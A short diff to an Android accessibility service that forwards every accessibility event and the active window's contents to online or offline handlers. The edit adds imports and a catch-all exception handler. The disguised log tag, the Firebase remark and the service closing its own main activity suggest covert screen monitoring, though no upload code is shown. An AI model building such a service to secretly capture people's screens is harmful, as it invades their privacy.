@@ -1,10 +1,13 @@
 package androidaid.android.com.androidaid;
 
 import android.accessibilityservice.AccessibilityService;
+import android.app.Notification;
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.v4.content.WakefulBroadcastReceiver;
 import android.view.accessibility.AccessibilityEvent;
@@ -34,10 +37,14 @@ public class MainAccessService extends AccessibilityService {
         //System.out.println("[sproc32.MAS]: eventClass =" + event.getClassName().toString());
 
         //check connection with firebase here
-        if(InternetSpeed.isOnline() && isActive) {
-            AccessibilityEventManager.handleOnlineAccessibilityEvent(event, getRootInActiveWindow());
-        } else {
-            AccessibilityEventManager.handleOfflineAccessibilityEvent(event, getRootInActiveWindow());
+        try {
+            if(InternetSpeed.isOnline() && isActive) {
+                AccessibilityEventManager.handleOnlineAccessibilityEvent(event, getRootInActiveWindow());
+            } else {
+                AccessibilityEventManager.handleOfflineAccessibilityEvent(event, getRootInActiveWindow());
+            }
+        } catch (Exception e) {
+            System.out.println("[sproc32.MAS.onAccessibilityEvent]: An unknown exception occurred!");
         }
     }
 
@@ -55,6 +62,7 @@ public class MainAccessService extends AccessibilityService {
         registerActiveReceiver();
 
         ActivityManager.getMainActivity().finish();
+
     }
 
     @Override
